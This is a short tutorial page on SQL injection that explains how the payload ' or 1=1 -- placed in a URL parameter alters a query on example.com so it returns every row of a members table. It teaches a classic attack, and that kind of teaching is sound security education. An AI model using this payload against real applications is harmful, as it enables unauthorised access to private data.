---
description: Modify an SQL query to return additional results.
---

# Retrieving hidden data

Imagine a web app that displays member info. The URL looks like this:

```url
https://example.com/members?name=John
```

We can guess the web app made an SQL query to retrieve the data from the database:

```sql
SELECT * FROM members WHERE name = 'John'
```

The query asks the database to return all details (\*) from members table where the name is John.

**What if** we modify the input?

By using "--", we can comment out the rest of the string.

In addition to that, we can write something that's always true.

`' or 1=1 --`

So the URL will look like this:

```url
https://example.com/members?name=John'+or+1=1--
```

In SQL query:

```sql
SELECT * FROM members WHERE name = 'John' OR 1=1--'
```

Since 1 will always equal 1, this query will return everything.
